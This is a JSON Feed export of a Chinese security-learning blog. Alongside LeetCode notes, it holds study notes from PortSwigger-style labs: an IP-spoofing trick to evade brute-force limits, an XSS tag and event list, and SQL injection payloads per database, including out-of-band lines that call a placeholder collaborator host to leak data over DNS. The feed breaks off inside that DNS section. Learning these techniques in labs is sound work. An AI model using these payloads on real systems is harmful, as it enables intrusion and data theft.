{
    "version": "https://jsonfeed.org/version/1",
    "title": "Vegetable Blog",
    "subtitle": "",
    "icon": "http://ericcd.com/images/favicon.ico",
    "description": "",
    "home_page_url": "http://ericcd.com",
    "items": [
        {
            "id": "http://ericcd.com/2022/12/22/BurpLab-2/",
            "url": "http://ericcd.com/2022/12/22/BurpLab-2/",
            "title": "BurpLab_2",
            "date_published": "2022-12-22T12:44:54.000Z",
            "content_html": "<p>记录在做 burp lab 时学会的知识点。<br />\n<span id=\"more\"></span></p>\n<h1 id=\"authentication-vulnerabilities\"><a class=\"anchor\" href=\"#authentication-vulnerabilities\">#</a> Authentication vulnerabilities</h1>\n<h2 id=\"vulnerabilities-in-password-based-login\"><a class=\"anchor\" href=\"#vulnerabilities-in-password-based-login\">#</a> Vulnerabilities in password-based login</h2>\n<h3 id=\"brute-force-attacks\"><a class=\"anchor\" href=\"#brute-force-attacks\">#</a> Brute-force attacks</h3>\n<h4 id=\"username-enumeration\"><a class=\"anchor\" href=\"#username-enumeration\">#</a> Username enumeration</h4>\n<p>1.Status codes<br />\n2.Error messages<br />\n3.Response times<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">X-Forwarded-For 是用来识别通过 HTTP 代理或负载均衡方式连接到 Web 服务器的客户端最原始的 IP 地址的 HTTP 请求头字段。，用它伪装 IP 地址来绕过对暴力破解的限制。</span><br></pre></td></tr></table></figure><br />\n####Flawed brute-force protection<br />\n 常见的暴力破解防护措施有两种：如果一个账号有太多的登录失败尝试，就封锁账号；封掉发起太多失败登录的 ip。<br />\n对于锁定 ip，有的后端可能会在一个 ip 地址登陆成功后重置计时器，因此可以通过间歇登录成功账号来重置计时器。</p>\n<p>####Account locking</p>\n",
            "tags": [
                "web",
                "web"
            ]
        },
        {
            "id": "http://ericcd.com/2022/11/30/XSS-cheet-sheet/",
            "url": "http://ericcd.com/2022/11/30/XSS-cheet-sheet/",
            "title": "XSS_cheet_sheet",
            "date_published": "2022-11-30T06:26:13.000Z",
            "content_html": "<p>payload 记录。<br />\n<span id=\"more\"></span><br />\n1.tags<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a</span><br><span class=\"line\">a2</span><br><span class=\"line\">abbr</span><br><span class=\"line\">acronym</span><br><span class=\"line\">address</span><br><span class=\"line\">animate</span><br><span class=\"line\">animatemotion</span><br><span class=\"line\">animatetransform</span><br><span class=\"line\">applet</span><br><span class=\"line\">area</span><br><span class=\"line\">article</span><br><span class=\"line\">aside</span><br><span class=\"line\">audio</span><br><span class=\"line\">audio2</span><br><span class=\"line\">b</span><br><span class=\"line\">bdi</span><br><span class=\"line\">bdo</span><br><span class=\"line\">big</span><br><span class=\"line\">blink</span><br><span class=\"line\">blockquote</span><br><span class=\"line\">body</span><br><span class=\"line\">br</span><br><span class=\"line\">button</span><br><span class=\"line\">canvas</span><br><span class=\"line\">caption</span><br><span class=\"line\">center</span><br><span class=\"line\">cite</span><br><span class=\"line\">code</span><br><span class=\"line\">col</span><br><span class=\"line\">colgroup</span><br><span class=\"line\">command</span><br><span class=\"line\">content</span><br><span class=\"line\">custom tags</span><br><span class=\"line\">data</span><br><span class=\"line\">datalist</span><br><span class=\"line\">dd</span><br><span class=\"line\">del</span><br><span class=\"line\">details</span><br><span class=\"line\">dfn</span><br><span class=\"line\">dialog</span><br><span class=\"line\">dir</span><br><span class=\"line\">div</span><br><span class=\"line\">dl</span><br><span class=\"line\">dt</span><br><span class=\"line\">element</span><br><span class=\"line\">em</span><br><span class=\"line\">embed</span><br><span class=\"line\">fieldset</span><br><span class=\"line\">figcaption</span><br><span class=\"line\">figure</span><br><span class=\"line\">font</span><br><span class=\"line\">footer</span><br><span class=\"line\">form</span><br><span class=\"line\">frame</span><br><span class=\"line\">frameset</span><br><span class=\"line\">h1</span><br><span class=\"line\">head</span><br><span class=\"line\">header</span><br><span class=\"line\">hgroup</span><br><span class=\"line\">hr</span><br><span class=\"line\">html</span><br><span class=\"line\">i</span><br><span class=\"line\">iframe</span><br><span class=\"line\">iframe2</span><br><span class=\"line\">image</span><br><span class=\"line\">image2</span><br><span class=\"line\">image3</span><br><span class=\"line\">img</span><br><span class=\"line\">img2</span><br><span class=\"line\">input</span><br><span class=\"line\">input2</span><br><span class=\"line\">input3</span><br><span class=\"line\">input4</span><br><span class=\"line\">ins</span><br><span class=\"line\">kbd</span><br><span class=\"line\">keygen</span><br><span class=\"line\">label</span><br><span class=\"line\">legend</span><br><span class=\"line\">li</span><br><span class=\"line\">link</span><br><span class=\"line\">listing</span><br><span class=\"line\">main</span><br><span class=\"line\">map</span><br><span class=\"line\">mark</span><br><span class=\"line\">marquee</span><br><span class=\"line\">menu</span><br><span class=\"line\">menuitem</span><br><span class=\"line\">meta</span><br><span class=\"line\">meter</span><br><span class=\"line\">multicol</span><br><span class=\"line\">nav</span><br><span class=\"line\">nextid</span><br><span class=\"line\">nobr</span><br><span class=\"line\">noembed</span><br><span class=\"line\">noframes</span><br><span class=\"line\">noscript</span><br><span class=\"line\">object</span><br><span class=\"line\">ol</span><br><span class=\"line\">optgroup</span><br><span class=\"line\">option</span><br><span class=\"line\">output</span><br><span class=\"line\">p</span><br><span class=\"line\">param</span><br><span class=\"line\">picture</span><br><span class=\"line\">plaintext</span><br><span class=\"line\">pre</span><br><span class=\"line\">progress</span><br><span class=\"line\">q</span><br><span class=\"line\">rb</span><br><span class=\"line\">rp</span><br><span class=\"line\">rt</span><br><span class=\"line\">rtc</span><br><span class=\"line\">ruby</span><br><span class=\"line\">s</span><br><span class=\"line\">samp</span><br><span class=\"line\">script</span><br><span class=\"line\">section</span><br><span class=\"line\">select</span><br><span class=\"line\">set</span><br><span class=\"line\">shadow</span><br><span class=\"line\">slot</span><br><span class=\"line\">small</span><br><span class=\"line\">source</span><br><span class=\"line\">spacer</span><br><span class=\"line\">span</span><br><span class=\"line\">strike</span><br><span class=\"line\">strong</span><br><span class=\"line\">style</span><br><span class=\"line\">sub</span><br><span class=\"line\">summary</span><br><span class=\"line\">sup</span><br><span class=\"line\">svg</span><br><span class=\"line\">table</span><br><span class=\"line\">tbody</span><br><span class=\"line\">td</span><br><span class=\"line\">template</span><br><span class=\"line\">textarea</span><br><span class=\"line\">tfoot</span><br><span class=\"line\">th</span><br><span class=\"line\">thead</span><br><span class=\"line\">time</span><br><span class=\"line\">title</span><br><span class=\"line\">tr</span><br><span class=\"line\">track</span><br><span class=\"line\">tt</span><br><span class=\"line\">u</span><br><span class=\"line\">ul</span><br><span class=\"line\">var</span><br><span class=\"line\">video</span><br><span class=\"line\">video2</span><br><span class=\"line\">wbr</span><br><span class=\"line\">xmp</span><br></pre></td></tr></table></figure></p>\n<p>2.events<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">onafterprint</span><br><span class=\"line\">onafterscriptexecute</span><br><span class=\"line\">onanimationcancel</span><br><span class=\"line\">onanimationend</span><br><span class=\"line\">onanimationiteration</span><br><span class=\"line\">onanimationstart</span><br><span class=\"line\">onauxclick</span><br><span class=\"line\">onbeforecopy</span><br><span class=\"line\">onbeforecut</span><br><span class=\"line\">onbeforeinput</span><br><span class=\"line\">onbeforeprint</span><br><span class=\"line\">onbeforescriptexecute</span><br><span class=\"line\">onbeforeunload</span><br><span class=\"line\">onbegin</span><br><span class=\"line\">onblur</span><br><span class=\"line\">onbounce</span><br><span class=\"line\">oncanplay</span><br><span class=\"line\">oncanplaythrough</span><br><span class=\"line\">onchange</span><br><span class=\"line\">onclick</span><br><span class=\"line\">onclose</span><br><span class=\"line\">oncontextmenu</span><br><span class=\"line\">oncopy</span><br><span class=\"line\">oncuechange</span><br><span class=\"line\">oncut</span><br><span class=\"line\">ondblclick</span><br><span class=\"line\">ondrag</span><br><span class=\"line\">ondragend</span><br><span class=\"line\">ondragenter</span><br><span class=\"line\">ondragleave</span><br><span class=\"line\">ondragover</span><br><span class=\"line\">ondragstart</span><br><span class=\"line\">ondrop</span><br><span class=\"line\">ondurationchange</span><br><span class=\"line\">onend</span><br><span class=\"line\">onended</span><br><span class=\"line\">onerror</span><br><span class=\"line\">onfinish</span><br><span class=\"line\">onfocus</span><br><span class=\"line\">onfocusin</span><br><span class=\"line\">onfocusout</span><br><span class=\"line\">onfullscreenchange</span><br><span class=\"line\">onhashchange</span><br><span class=\"line\">oninput</span><br><span class=\"line\">oninvalid</span><br><span class=\"line\">onkeydown</span><br><span class=\"line\">onkeypress</span><br><span class=\"line\">onkeyup</span><br><span class=\"line\">onload</span><br><span class=\"line\">onloadeddata</span><br><span class=\"line\">onloadedmetadata</span><br><span class=\"line\">onloadend</span><br><span class=\"line\">onloadstart</span><br><span class=\"line\">onmessage</span><br><span class=\"line\">onmousedown</span><br><span class=\"line\">onmouseenter</span><br><span class=\"line\">onmouseleave</span><br><span class=\"line\">onmousemove</span><br><span class=\"line\">onmouseout</span><br><span class=\"line\">onmouseover</span><br><span class=\"line\">onmouseup</span><br><span class=\"line\">onmousewheel</span><br><span class=\"line\">onmozfullscreenchange</span><br><span class=\"line\">onpagehide</span><br><span class=\"line\">onpageshow</span><br><span class=\"line\">onpaste</span><br><span class=\"line\">onpause</span><br><span class=\"line\">onplay</span><br><span class=\"line\">onplaying</span><br><span class=\"line\">onpointerdown</span><br><span class=\"line\">onpointerenter</span><br><span class=\"line\">onpointerleave</span><br><span class=\"line\">onpointermove</span><br><span class=\"line\">onpointerout</span><br><span class=\"line\">onpointerover</span><br><span class=\"line\">onpointerrawupdate</span><br><span class=\"line\">onpointerup</span><br><span class=\"line\">onpopstate</span><br><span class=\"line\">onprogress</span><br><span class=\"line\">onratechange</span><br><span class=\"line\">onrepeat</span><br><span class=\"line\">onreset</span><br><span class=\"line\">onresize</span><br><span class=\"line\">onscroll</span><br><span class=\"line\">onsearch</span><br><span class=\"line\">onseeked</span><br><span class=\"line\">onseeking</span><br><span class=\"line\">onselect</span><br><span class=\"line\">onselectionchange</span><br><span class=\"line\">onselectstart</span><br><span class=\"line\">onshow</span><br><span class=\"line\">onstart</span><br><span class=\"line\">onsubmit</span><br><span class=\"line\">ontimeupdate</span><br><span class=\"line\">ontoggle</span><br><span class=\"line\">ontouchend</span><br><span class=\"line\">ontouchmove</span><br><span class=\"line\">ontouchstart</span><br><span class=\"line\">ontransitioncancel</span><br><span class=\"line\">ontransitionend</span><br><span class=\"line\">ontransitionrun</span><br><span class=\"line\">ontransitionstart</span><br><span class=\"line\">onunhandledrejection</span><br><span class=\"line\">onunload</span><br><span class=\"line\">onvolumechange</span><br><span class=\"line\">onwebkitanimationend</span><br><span class=\"line\">onwebkitanimationiteration</span><br><span class=\"line\">onwebkitanimationstart</span><br><span class=\"line\">onwebkittransitionend</span><br><span class=\"line\">onwheel</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "web",
                "web"
            ]
        },
        {
            "id": "http://ericcd.com/2022/11/29/leetcode/",
            "url": "http://ericcd.com/2022/11/29/leetcode/",
            "title": "leetcode",
            "date_published": "2022-11-29T11:26:56.000Z",
            "content_html": "<p>LeetCode 记录。<br />\n<span id=\"more\"></span></p>\n<ol>\n<li>\n<p>使用单调栈求坡的最大宽度。<br />\n2.（117）填充每个节点的下一个右侧节点指针 II：<br />\n给定一个二叉树，填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。初始状态下，所有 next 指针都被设置为 NULL。<br />\n3.（201） 数字范围按位与：<br />\n给你两个整数 left 和 right ，表示区间 [left, right] ，返回此区间内所有数字 按位与 的结果（包含 left 、right 端点）。</p>\n</li>\n<li>\n<p>清空 vector 元素并释放空间。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">vector&lt;int&gt; ().swap (Vector);</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>重新排列单词间的空格。<br />\n使用流区分字符和空格；string 的创建方式。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">string reorderSpaces (string text) &#123;</span><br><span class=\"line\">           vector&lt;string&gt;  str_vec;</span><br><span class=\"line\">           int count = 0;</span><br><span class=\"line\">           string word, ans;</span><br><span class=\"line\">           stringstream in (text);</span><br><span class=\"line\">           while (in &gt;&gt; word)</span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">               str_vec.push_back (word);</span><br><span class=\"line\">               count += word.size (); </span><br><span class=\"line\">           &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">           if (str_vec.size () == 1)</span><br><span class=\"line\">              ans = str_vec [0];</span><br><span class=\"line\">            else</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                string space ((text.size () - count)/(str_vec.size () - 1), &#x27; &#x27;);</span><br><span class=\"line\">                for (int i =0; i&lt; str_vec.size () - 1; i++)</span><br><span class=\"line\">                       ans += str_vec [i] + space;</span><br><span class=\"line\">                ans += str_vec.back ();        </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            return ans + string (text.size () - ans.size (), &#x27; &#x27;);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure><br />\n6.(1122) 数组的相对排序。<br />\nunordered_map，hash 表的使用；sort 的自定义排序方法。</p>\n</li>\n<li>\n<p>旋转数字</p>\n</li>\n</ol>\n",
            "tags": [
                "LeetCode",
                "LeetCode"
            ]
        },
        {
            "id": "http://ericcd.com/2022/11/22/BurpLab/",
            "url": "http://ericcd.com/2022/11/22/BurpLab/",
            "title": "BurpLab",
            "date_published": "2022-11-22T12:13:02.000Z",
            "content_html": "<p>记录在做 burp lab 时学会的知识点。<br />\n<span id=\"more\"></span></p>\n<h3 id=\"sql-注入\"><a class=\"anchor\" href=\"#sql-注入\">#</a> SQL 注入</h3>\n<ol>\n<li>\n<p>使用 select 判断列数和获取返回值时，有时 SELECT 1,2,3 不行而 SELECT NULL,NULL,NULL 可以，可能是因为 sql 的返回值类型需要与后端接收的类型相匹配，SELECT 1,2,3 返回的都是数字，而使用 NULL 会返回不确定类型 NULL。</p>\n</li>\n<li>\n<p>只能返回一条字符串语句，但是需要读取多个字符串的值时，可以使用字符串拼接。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Oracle:  &#x27;foo&#x27;||&#x27;bar&#x27;</span><br><span class=\"line\">Microsoft:  &#x27;foo&#x27;+&#x27;bar&#x27;</span><br><span class=\"line\">PostgreSQL:  foo&#x27;||&#x27;bar&#x27;</span><br><span class=\"line\">MySQL:  &#x27;foo&#x27; &#x27;bar&#x27; [Note the space between the two strings],  CONCAT (&#x27;foo&#x27;,&#x27;bar&#x27;)</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>在 Oracle 中，每一条 SELECT 语句后续都要跟一个 FROM，如果不确定要搜索哪个表，可以使用虚表 dual 来进行测试，例如 SELECT NULL FROM dual。</p>\n</li>\n<li>\n<p>获取数据库版本信息。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Oracle:  SELECT banner FROM v$version,  SELECT version FROM v$instance</span><br><span class=\"line\">Microsoft:  SELECT @@version</span><br><span class=\"line\">PostgreSQL:  SELECT version ()</span><br><span class=\"line\">MySQL:  SELECT @@version</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>获取数据库中存储的表名以及其中的列名。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Oracle:  SELECT * FROM all_tables,  SELECT * FROM all_tab_columns WHERE table_name = &#x27;TABLE-NAME-HERE&#x27;</span><br><span class=\"line\">Microsoft:  SELECT * FROM information_schema.tables,  SELECT * FROM information_schema.columns WHERE table_name = &#x27;TABLE-NAME-HERE&#x27;</span><br><span class=\"line\">PostgreSQL:  SELECT * FROM information_schema.tables,  SELECT * FROM information_schema.columns WHERE table_name = &#x27;TABLE-NAME-HERE&#x27;</span><br><span class=\"line\">MySQL:  SELECT * FROM information_schema.tables,  SELECT * FROM information_schema.columns WHERE table_name = &#x27;TABLE-NAME-HERE&#x27;</span><br></pre></td></tr></table></figure></p>\n</li>\n</ol>\n<p>6.Oracle 中没有 LIMIT 命令，可以试着用 ROWNUM 取代下。<br />\n7. 可以用以下命令测试网页是否会根据返回值的 Ture or False 变换。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Oracle SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR (1/0) ELSE NULL END FROM dual</span><br><span class=\"line\">Microsoft\tSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</span><br><span class=\"line\">PostgreSQL\t1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST (1/0 AS INTEGER) ELSE NULL END)</span><br><span class=\"line\">MySQL\tSELECT IF (YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#x27;a&#x27;)</span><br></pre></td></tr></table></figure></p>\n<ol start=\"8\">\n<li>\n<p>后端可能接受一个 int 值，也可能接收 string，也可能接收一行，这需要自己测试判断。</p>\n</li>\n<li>\n<p>获取截断的字符串。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Oracle\tSUBSTR (&#x27;foobar&#x27;, 4, 2)</span><br><span class=\"line\">Microsoft\tSUBSTRING (&#x27;foobar&#x27;, 4, 2)</span><br><span class=\"line\">PostgreSQL\tSUBSTRING (&#x27;foobar&#x27;, 4, 2)</span><br><span class=\"line\">MySQL\tSUBSTRING (&#x27;foobar&#x27;, 4, 2)</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>延时注入，但是后端如果异步执行 SQL，可能造成该方法失效。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Oracle\tdbms_pipe.receive_message ((&#x27;a&#x27;),10)</span><br><span class=\"line\">Microsoft\tWAITFOR DELAY &#x27;0:0:10&#x27;</span><br><span class=\"line\">PostgreSQL\tSELECT pg_sleep (10)</span><br><span class=\"line\">MySQL\tSELECT SLEEP (10)</span><br></pre></td></tr></table></figure><br />\n11.DNS 查询<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Oracle：SELECT EXTRACTVALUE (xmltype (&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">              &lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; % remote;]&gt;&#x27;),&#x27;/l&#x27;)</span><br><span class=\"line\">              FROM dual（有的版本能用，有的版本已经修复了）</span><br><span class=\"line\">              SELECT UTL_INADDR.get_host_address (&#x27;BURP-COLLABORATOR-SUBDOMAIN&#x27;)（所有版本都能用，但需要权限）</span><br><span class=\"line\">Microsoft：  exec master..xp_dirtree &#x27;//BURP-COLLABORATOR-SUBDOMAIN/a&#x27;</span><br><span class=\"line\">PostgreSQL： copy (SELECT &#x27;&#x27;) to program &#x27;nslookup BURP-COLLABORATOR-SUBDOMAIN&#x27;</span><br><span class=\"line\">MySQL： LOAD_FILE (&#x27;\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a&#x27;)</span><br><span class=\"line\">                SELECT ... INTO OUTFILE &#x27;\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#x27;（只适用于 windows 后端）</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>使用 DNS 查询带数据：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 